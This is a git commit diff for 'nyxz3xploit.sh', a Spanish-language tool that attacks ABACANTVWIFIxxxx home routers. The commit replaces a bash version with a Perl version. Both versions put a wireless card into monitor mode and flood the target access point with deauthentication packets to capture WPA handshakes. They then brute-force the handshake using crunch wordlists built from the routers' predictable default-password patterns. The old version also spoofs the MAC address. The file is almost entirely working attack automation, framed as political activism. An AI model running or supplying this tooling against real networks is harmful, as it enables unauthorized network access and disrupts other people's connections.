9cba53115b55c830736fd2f37f367aa63f23fe1c
nyxz3n <nyxzen@protonmail.com>
2017-04-22 05:05:25 -0500

    Update nyxz3xploit.sh

--- nyxz3xploit.sh
+++ nyxz3xploit.sh
@@ -1,278 +1,201 @@
-#!/bin/bash
-# Este script hace uso de las contraseñas
-# por defecto en los routers ABACANTVWIFIxxxx Huawei Inc.
-# Escrito por @NyxZ3n, me hago responsable del uso del mismo
-# Pues ante la dictadura, yo también soy responsable de hacer
-# un cambio por el país. NO A LA DESINFORMACIÓN, 
-# DEBEMOS ESTAR COMUNICADOS SIEMPRE.
-# CharsetDiccionario = 85047928%%%%%%, 85047929%%%%%% 8504792%%%%%%%
+#! /usr/bin/perl
+use Switch;
 
+sub main(){
+system "clear";
+print"\033[031mADVERTENCIA! Para correr este script necesitas ser usuario ROOT \n\n \033[34m";
+system "sleep 2";
+system "clear";
 
+print "-------------------------------------------------------\n";
+print "--                                                   --\n";
+print "--                                                   --\n";
+print "--                   Script By NyxZ3n                --\n";
+print "--                                                   --\n";
+print "--     Este script automatiza la fuerza bruta        --\n";
+print "--       hacia los routers ABACANTVWIFIxxxx          --\n";
+print "--   haciendo uso de las passwords predeterminadas   --\n";
+print "--                                                   --\n";
+print "--                                                   --\n";
+print "-------------------------------------------------------\n";
+print "\n\n\n";
+print "1. Escanear Redes & Capturar HandShake \n";
+print "2. Atacar HandShake & Crear/Usar Diccionario \n";
+print "3. Ver HandShakes disponibles y/o recolectados \n";
+print "4. Salir \033[36m";
+print "\n\n";
+$opcion = <>;
+chomp $opcion;
+}
+sub Mon{
+		system "sudo service networking stop";
+		system "sudo service network-manager stop";
+		system "sudo ifconfig '$WIRELESS' down";
+		system "sudo iwconfig '$WIRELESS' mode monitor";
+		system "sudo ifconfig '$WIRELESS' up";
+	}
 
+sub Mangd{	
+		system "sudo service networking start";
+		system "sudo service network-manager start";
+		system "sudo ifconfig '$WIRELESS' down";
+		system "sudo iwconfig '$WIRELESS' mode managed";
+		system "sudo ifconfig '$WIRELESS' up";
+	}
 
-echo "¡ADVERTENCIA! Necesitas ser usuario root(superusuario) para correr el script"
-sleep 3
+sub Scan{
+		system "clear";
+		print "\e[36mIniciando Escaneo de Redes \033[0m";
+		system "sleep 1";
+		system "sudo airodump-ng '$WIRELESS' --manufacturer";
+	}
 
-HANDSHAKE="HandShake.cap"
+sub Handshake{
+		print "\n\n";
+		print "\033[36mCapturar HandShake \033[0m\n";
+		print "\n BSSID de la red: ";
+		$BSSID=<>;
+		chomp $BSSID;
+		print "\n Channel de la red: ";
+		$CHANNEL=<>;
+		chomp $CHANNEL;
+		print "\n Nombre del HandShake: ";
+		$HandShake =<>;
+		chomp $HandShake;
+		print "\n Tiempo de escucha en segundos (ej 15): ";
+		$TIEMPO=<>;
+		chomp $TIEMPO;
+		$TIEMPO2="'${TIEMPO}'s";
+		$TIEMPO3=$TIEMPO + 3;
+		system "sleep 1";
+		system "clear";
+	
+		print "Comenzando Captura \n";
+		system "sleep 1";
+		system "clear";
+		$AIRODUMP="timeout '$TIEMPO2' airodump-ng --ig -w '$HandShake' -c '$CHANNEL' --bssid '$BSSID' '$WIRELESS' --manufacturer &timeout '$TIEMPO2' xterm -hold -e \"while true; do sleep 5; aireplay-ng -0 5 -q 2 --ig -a '$BSSID' '$WIRELESS'; done\"";
+		system $AIRODUMP;
+		system "mv '${HandShake}*.cap' '${HandShake}.cap'";
+		system "sudo rm *.kismet.*";
+		system "sudo rm *.csv";
+		print "\n\n";
+		system "clear";
+		print "HandShake Capturado(s/n)?";
+		print "\n";
+		$SI = <>;
+		if($SI == 's'){
+		print "Restaurando interfaz '$WIRELESS'";
+		Mangd();
+		system"sleep 2";
+		main();
+		
+		;}else{ Handshake();}
+	}
+		
+sub SwitchF(){
 
-clear
-echo "------------------------------------------------"
-echo "                Script by @NyxZ3n               "
-echo "                                                "
-echo "   BruteForce a contraseñas predeterminadas en  "
-echo "   routers ABACANTVWIFIxxxx                     "
-echo "------------------------------------------------"
-echo ""
-echo "========Presiona enter para continuar========"
-read EMPEZAR
-if [[ $EMPEZAR == "" ]]; then
-clear
-fi
+switch($opcion){
 
-echo "----------------------------------------------------"
-echo "-Empezar modo monitor en la interfaz wireless[s/n]?-"
-echo "----------------------------------------------------"
-echo ""
-read MONIF
+	case "1" {
+	
+	system("sleep 1");
+	system("clear");
 
-if [[ $MONIF == 's' ]]; then
-echo ""
-echo "Terminando procesos que pudiesen interferir"
-echo ""
-echo ""
-sudo service networking stop
-sudo service network-manager stop
-iwconfig
-echo ""
-echo "Selecciona tarjeta wireless impresa arriba:"
-echo ""
-read WIRELESS
-[[ $WIRELESS == "" ]]
-clear
-echo "Empezando modo monitor con $WIRELESS..."
-echo ""
-echo ""
-sleep 1
-echo "Perderá su conexión previa durante el ataque."
-sudo ifconfig $WIRELESS down
-sudo iwconfig $WIRELESS mode monitor
-sudo ifconfig $WIRELESS up
-sleep 3
-clear
-else
-echo ""
-echo "No hay nada que hacer."
-exit
-sleep 2
-clear
-fi
+	system "sudo iwconfig";
+        print"\e[36mPor favor introduce tu tarjeta wireless: \e[0m";
+        $WIRELESS = <>;
+        chomp $WIRELESS;
+	print "\n";
+	print "Presione CTRL + C para detener el escaneo";
+	system "sleep 3";
+	
+	Mon();
+	Scan();
+	Handshake();	
+}
+	case "2"{
+	system("sleep 2");
+	system("clear");	
+	
+	print "\033[33m---------------------------------------------------------------------\n";
+	print "--                                                                 --\n";
+	print "--  1.Charset 85047928%%%%%%       (15 Minutos Aproximadamente)    --\n";
+	print "--  2.Charset 85047929%%%%%%       (15 Minutos Aproximadamente)    --\n";
+	print "--  3.Charset 8504792%%%%%%%       (1 Hora Aproximadamente    )    --\n";
+	print "--                                                                 --\n";
+	print "---------------------------------------------------------------------\n";
+	
+	$optdic = <>;
+	chomp $optdic;
+	switch($optdic){
+	
+	case "1"{
+	system "clear";
+	print "\n";
+	print "\033[36m Nombre del diccionario: ";
+	$DIC = <>;
+	chomp $DIC;
+	print "\n\n";
+	print "\033[36m Nombre del HandShake: \n\n";
+	print "\033[36m\n";
+	system "ls | grep -e .cap";
+	$HandShake1 =<>;
+	
+	system "crunch 14 14 -t 85047928%%%%%% -o '$DIC'";
+	system "aircrack-ng -w '$DIC' '$HandShake1'";
+	}
 
-echo "----------------------------------------"
-echo "-    Desea hacer MAC Spoofing [s/n]?   -"
-echo "----------------------------------------"
-echo ""
-read MACSPF
+	case "2"{
+	system ("clear");
+	print"\n";
+        print "\033[36m Nombre del diccionario: ";
+        $DIC2 = <>;
+	chomp $DIC2;  
+	print "\n\n";
+	print "\033[36m Nombre del HandShake: \n\n";
+	print "\033[0m";
+        system "ls | grep -e .cap";
+	print "\033[36m\n";
+        $HandShake1 =<>;
 
-if [[ $MACSPF == 's' ]]; then
-echo ""
-echo "Apagando interfaces Wireless"
-echo ""
-sleep 2
-sudo ifconfig $WIRELESS down
-echo "Cambiando a MAC randomizada"
-echo ""
-sudo macchanger -r $WIRELESS 
-echo ""
-echo "Levantando interfaz Spoofeada"
-echo ""
-sleep 2
-clear
-sudo ifconfig $WIRELESS up
-else
-echo ""
-echo "Ignorando"
-sleep 1
-clear
-fi
+        system "crunch 14 14 -t 85047929%%%%%% -o '$DIC2'";
+        system "aircrack-ng -w '$DIC2' '$HandShake1'";
+        }
 
+	case "3"{
+	system ("clear");
+        print "\033[36m Nombre del diccionario: ";
+        $DIC3 = <>; 
+	chomp $DIC3; 
+	print "\n\n";
+	print "\033[36m Nombre del HandShake: \n\n";
+        print "\033[0m";
+        system "ls | grep -e .cap";
+	print"\033[36m\n";
+        $HandShake1 =<>;
+        system "crunch 14 14 -t 8504792%%%%%%% -o '$DIC3'";
+        system "aircrack-ng -w '$DIC3' '$HandShake1'";
+        }
 
-echo "----------------------------------------------------------------"
-echo "-  Verificar routers en el perimetro[s/n]? (n Si ya realizado) -"
-echo "----------------------------------------------------------------"
-echo ""
-read DUMP
-if [[ $DUMP == 's' ]]; then
-echo ""
-echo "Al encontrar la red, presione CTRL + C."
-echo ""
-echo "Routers: ABACANTVWIFIxxxx"
-echo "Manufacturer: Huawei Inc. ó ZTE"
-sleep 4
-sudo airodump-ng $WIRELESS --manufacturer
-else
-sleep 2
-clear
-fi
+	
+	}	
+}
+	case "3"{
+	
+	system("sudo aircrack-ng *.cap");
+	}
 
-while true
-do
-echo "---------------------------------------------------------"
-echo "-       Capturar el Handshake[s/n]? (n Si ya realizado) -"
-echo "---------------------------------------------------------"
-echo ""
-read HANDC
+	case "4"{
+	system "clear";
+	print "\033[31mHappy Hacking!";
+	system"sleep 1";
+	system"clear";
+	
+	}
+	
+	else  {print "Selecciona una opción válida.";}
 
-if [[ $HANDC == 's' ]]; then
-sleep 4
-echo ""
-echo "Ingrese BSSID de la red (EJ: A1:F3:45:12:34:90):  "
-echo ""
-read BSSID
-[[ $BSSID == "" ]]
-echo ""
-echo "Ingrese el channel de la red [1-14]:"
-echo ""
-read CHNEL
-[[ $CHNEL == "" ]]
-echo ""
-echo "-------------------------------------------------------------------"
-echo "-Tiempo para captura de HandShake en segundos:  (120 recomendado)-"
-echo "-------------------------------------------------------------------"
-echo ""
-read TIEMPO1
-TIEMPO3=$(($TIEMPO1 + 2))
-SEGUNDOS='s'
-TIEMPO2=$TIEMPO1$SEGUNDOS
-sleep 2
-clear
-timeout $TIEMPO2 airodump-ng --ig -w HandShake -c $CHNEL --bssid $BSSID $WIRELESS --manufacturer & timeout $TIEMPO2 xterm -hold -e "while true; do sleep 5; sudo aireplay-ng -0 5 -q 2 --ig -a $BSSID $WIRELESS; done" & sleep $TIEMPO3; kill $!
-echo ""
-echo ""
-echo ""
-echo "Presiona enter."
-clear
-echo ""
-sudo mv HandShake*.cap HandShake.cap
-sudo rm HandShake*.csv
-sudo rm HandShake*.kismet.*
-clear
-else
-sleep 1
-clear
-fi
-
-echo "-----------------------------------------------------------------------"
-echo "-                     Handshake Capturado[s/n]?                       -"
-echo "-----------------------------------------------------------------------"
-read SI
-if [[ $SI == 's' ]]; then
-clear
-echo ""
-sleep 2
-break
-fi
-
-done
-echo "-----------------------------------------------------------------------"
-echo "-    Desea devolver la interfaz $WIRELESS a su modo normal[s/n]?-      "
-echo "-----------------------------------------------------------------------"
-echo ""
-read RESTOR
-
-if [[ $RESTOR == "s" ]]; then
-echo ""
-echo "Desactivando modo monitor"
-sudo ifconfig $WIRELESS down
-sudo iwconfig $WIRELESS mode managed
-echo "Apagando interfaz"
-echo ""
-echo "Restaurando MAC original"
-echo ""
-sleep 1
-sudo macchanger -p $WIRELESS
-echo ""
-echo "Levantando interfaz $WIRELESS"
-echo ""
-sleep 1
-sudo ifconfig $WIRELESS up
-echo "Interfaz $WIRELESS restaurada"
-echo ""
-echo "Devolviendo Network manager y networking"
-sudo service network-manager start
-sudo service networking start
-clear
-else
-echo ""
-echo "NO A LA DESINFORMACIÓN/DESCOMUNICACIÓN"
-sleep 1
-clear
-fi
-
-while true
-do
-clear
-echo "-------------------- Seleccione ---------------------"
-echo "--                                                 --"
-echo "-- 1. Ver handshakes             (Ctrl-C to exit  )--"
-echo "-- 2. Charset:85047928%%%%%%     (10 minutos aprox)--"
-echo "-- 3. Charset:85047929%%%%%%     (10 minutos aprox)--"
-echo "-- 4. Charset:8504792%%%%%%%     (1hora aprox     )--"
-echo "--                                                 --"
-echo "-- No descartes ninguna opción.                    --"
-echo "--                                                 --"
-echo "-----------------------------------------------------"
-echo ""
-
-read n
-case $n in
-1)(xterm -hold -e sudo aircrack-ng $HANDSHAKE) & ;;
-
-2)clear
-echo "Empezando fuerza bruta de 6 dígitos numéricos."
-echo ""
-echo "Por favor ingrese un nombre para el diccionario:"
-echo ""
-read DICCIONARIO
-echo ""
-crunch 14 14 -t 85047928%%%%%% -o $DICCIONARIO
-echo ""
-sudo aircrack-ng -w $DICCIONARIO $HANDSHAKE
-echo ""
-read -p "Presione cualquier tecla para volver.";;
-
-3)clear
-echo "Empezando fuerza bruta de 6 dígitos numéricos."
-echo ""
-echo "Por favor ingrese un nombre para el diccionario:"
-echo ""
-read DICCIONARIO
-echo ""
-crunch 14 14 -t 85047929%%%%%% -o $DICCIONARIO2
-echo ""
-sudo aircrack-ng -w $DICCIONARIO2 $HANDSHAKE
-echo ""
-read -p "Presione cualquier tecla para volver.";;
-
-
-
-4)clear
-echo "Empezando fuerza bruta de 7 dígitos numéricos."
-echo ""
-echo "Por favor ingrese un nombre para el diccionario:"
-echo ""
-read DICCIONARIO2
-echo ""
-crunch 14 14 -t 8504792%%%%%%% -o $DICCIONARIO3
-echo""
-sudo aircrack-ng -w $DICCIONARIO3 $HANDSHAKE
-echo ""
-read -p "Presione cualquier tecla para volver.";;
-
-*)clear
-echo "Opción inválida"
-echo ""
-read -p "Presione cualquier tecla para volver.";;
-
-esac
-sleep 1
-done
+}
+}
+main();
+SwitchF();
